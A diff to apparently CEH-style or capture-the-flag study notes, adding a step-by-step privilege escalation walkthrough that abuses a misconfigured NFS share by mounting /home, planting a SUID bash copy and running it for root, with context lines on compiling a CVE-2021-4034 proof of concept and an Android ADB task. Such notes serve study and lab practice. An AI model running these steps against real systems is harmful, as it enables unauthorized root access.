@@ -37,6 +37,28 @@ Use LinPeas
 13. to compile you can use gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
 14. then ./cve-2021-4034-poc and press enter you should be root.
 
+Priviledge Escalation 2
+Exploiting misconfigured NFS (port 2049)
+1.	nmap -sV —p 2049 IP/Subnet
+2.	sudo apt-get install nfs-common
+3.	nmap -sV —script=nfs-showmount <Target_IP>
+4.	check available mounts: showmount -e <Target_IP> -> we will see /home directory
+5.	mkdir /tmp/nfs
+6.	sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
+7.	cd /tmp/nfs
+8.	sudo cp /bin/bash .
+9.	sudo chmod +s bash -> it will be highlighted in red
+10.	ls -la
+11.	sudo df -h
+12.	sudo chmod +s bash
+after them, In another terminal:
+	1. Access to target using SSH
+	2. ./bash -p and we're root!
+	3. cd /home
+	4. ls -la
+	5. Find the flag: find / -name "*.txt" -ls 2> /dev/null
+
+
 
 **ADB Android Hacking** 
 Perform deep scan on the elf files and obtain the last 4 digits of SHA 384 hash of the file with highest entropy value locate into android folder
